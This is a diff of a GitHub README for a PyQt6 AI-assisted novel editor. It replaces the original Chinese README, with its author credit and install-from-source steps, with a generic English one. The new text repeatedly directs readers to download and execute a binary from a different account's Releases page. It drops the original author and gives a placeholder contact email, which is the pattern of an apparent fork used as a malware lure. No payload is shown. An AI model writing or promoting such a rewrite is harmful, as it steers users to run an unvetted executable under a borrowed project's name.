@@ -1,141 +1,106 @@
+# AI Novel Editor: Your AI-Powered Writing Companion ✍️🤖
 
-<div align="right">
-  <details>
-    <summary >🌐 Language</summary>
-    <div>
-      <div align="right">
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=en">English</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=zh-CN">简体中文</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=zh-TW">繁體中文</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=ja">日本語</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=ko">한국어</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=hi">हिन्दी</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=th">ไทย</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=fr">Français</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=de">Deutsch</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=es">Español</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=it">Itapano</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=ru">Русский</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=pt">Português</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=nl">Nederlands</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=pl">Polski</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=ar">العربية</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=fa">فارسی</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=tr">Türkçe</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=vi">Tiếng Việt</a></p>
-        <p><a href="https://openaitx.github.io/view.html?user=inliver233&project=Ai-Novel-Editor&lang=id">Bahasa Indonesia</a></p>
-      </div>
-    </div>
-  </details>
-</div>
+![AI Novel Editor](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge&logo=github&link=https://github.com/BHUIYAN17/Ai-Novel-Editor/releases)
 
-# AI Novel Editor
+## Table of Contents
 
-基于PyQt6的AI辅助小说编辑器，提供智能补全、项目管理、概念组织等专业写作工具。
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## 安装
+## Overview
 
-1. 克隆项目
-```bash
-git clone https://github.com/inliver233/Ai-Novel-Editor.git
-cd ai-novel-editor
-```
+The **AI Novel Editor** is an AI-assisted tool designed to help writers streamline their novel editing process. Built using Python and PyQt6, this application offers a user-friendly interface that enhances productivity and creativity. Whether you're drafting your first novel or polishing your manuscript, this tool provides the support you need.
 
-2. 创建虚拟环境
-```bash
-python -m venv venv
-venv\Scripts\activate     # Windows
-```
+## Features
 
-3. 安装依赖
-```bash
-pip install -r requirements.txt
-```
+- **AI Suggestions**: Get real-time suggestions to improve your writing style and grammar.
+- **User-Friendly Interface**: Navigate easily through the application with a clean layout.
+- **Customizable Settings**: Adjust the editor according to your preferences.
+- **Export Options**: Save your work in various formats, including .txt and .docx.
+- **Auto-Save**: Never lose your progress with automatic saving features.
 
-4. 运行程序
-```bash
-python src/main.py
-```
+## Installation
 
-## 主要功能
+To get started with the AI Novel Editor, follow these steps:
 
-### 项目管理
-- 层次化文档结构（作品 > 章节 > 场景）
-- 项目导入导出（支持TEXT、MARKDOWN、DOCX、PDF、HTML格式）
-- 自动备份和版本控制
-- 多项目管理
+1. **Download the latest release** from the [Releases page](https://github.com/BHUIYAN17/Ai-Novel-Editor/releases). You will find the executable file that you need to download and execute.
+   
+2. **Install the required dependencies**. You can do this by running the following command in your terminal:
 
-### AI补全功能
-- 三种补全模式：自动补全、手动补全(推荐 按一次tab触发一次 再按一次tab应用补全)、禁用补全
-- 三种上下文模式：
-  - 快速模式：轻量级上下文，快速响应
-  - 平衡模式：中等上下文，质量与速度平衡
-  - 全局模式：完整项目上下文，最佳效果
-- 支持多种AI服务：OpenAI、Claude、通义千问、智谱AI、DeepSeek、Groq等
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-### 大纲管理
-- 可视化大纲树结构
-- 拖拽排序和层级调整
-- 文档快速导航
-- 大纲分析和优化建议
+3. **Run the application**. After installation, you can start the editor with the command:
 
-### API配置
-- 统一的AI配置中心
-- 多服务商预设配置
-- 连接测试功能
-- 配置方案保存和导入导出
+   ```bash
+   python main.py
+   ```
 
-### 智能补全设置
-- 可调节的触发延迟
-- 补全长度限制
-- 上下文长度配置
-- 流式响应支持
+## Usage
 
-### 提示词编辑
-- 内置多种写作模板
-- 自定义提示词模板
-- 模板分类管理
-- 模式特定模板配置
+Once you have installed the AI Novel Editor, you can start using it right away. Here’s how:
 
-### 界面功能
-- 明暗双主题
-- 三栏式布局（项目树、编辑器、概念面板）
-- 可折叠侧边栏
-- 全屏写作模式
-- 专注模式（句子、段落、打字机、禅模式、沉浸模式）
+1. **Open the Application**: Launch the application by double-clicking the executable file or running the command mentioned above.
 
-### 搜索和替换
-- 全项目文本搜索
-- 正则表达式支持
-- 批量替换功能
-- 高级搜索选项
+2. **Create or Open a Document**: You can either start a new document or open an existing one. The interface allows you to easily navigate through your files.
 
-### 概念管理
-- 自动检测角色、地点、物品
-- 概念关系管理
-- 标签和分类系统
-- 概念快速插入
+3. **Edit with AI Assistance**: As you write, the AI will provide suggestions for grammar, style, and structure. You can accept or ignore these suggestions based on your preference.
 
-## 快捷键
+4. **Save Your Work**: Make sure to save your progress regularly. The auto-save feature helps, but it’s always good to manually save your work as well.
 
-- `Ctrl+N`: 新建项目
-- `Ctrl+O`: 打开项目
-- `Ctrl+S`: 保存文档
-- `F11`: 全屏模式
-- `Tab`: 手动触发AI补全（手动模式下）
-- `Ctrl+F`: 查找
-- `Ctrl+H`: 查找替换
-- `Ctrl+Shift+H`: 高级查找替换
+5. **Export Your Document**: Once you finish editing, you can export your document in your desired format.
 
+## Contributing
 
-## 系统要求
+We welcome contributions from the community! If you would like to contribute to the AI Novel Editor, please follow these steps:
 
-- Python 3.8+
-- PyQt6
-- 操作系统：Windows、macOS、Linux
+1. **Fork the Repository**: Click the "Fork" button at the top right corner of the repository page.
 
-## 作者
+2. **Clone Your Fork**: Use the following command to clone your forked repository:
 
-**inliver**
-- 邮箱：inliverapi@outlook.com  
-- GitHub：https://github.com/inliver233
+   ```bash
+   git clone https://github.com/YOUR_USERNAME/Ai-Novel-Editor.git
+   ```
+
+3. **Create a Branch**: Create a new branch for your feature or fix:
+
+   ```bash
+   git checkout -b feature-name
+   ```
+
+4. **Make Your Changes**: Implement your changes and test them thoroughly.
+
+5. **Commit Your Changes**: Use clear commit messages to describe your changes:
+
+   ```bash
+   git commit -m "Add feature or fix description"
+   ```
+
+6. **Push to Your Fork**: Push your changes back to your forked repository:
+
+   ```bash
+   git push origin feature-name
+   ```
+
+7. **Create a Pull Request**: Go to the original repository and create a pull request. We will review your changes and merge them if they meet our standards.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, please reach out via the following methods:
+
+- **Email**: [your.email@example.com](mailto:your.email@example.com)
+- **GitHub Issues**: You can also create an issue in the repository for any bugs or feature requests.
+
+---
+
+Feel free to explore the [Releases page](https://github.com/BHUIYAN17/Ai-Novel-Editor/releases) for the latest updates and versions. Your feedback and contributions are highly appreciated!
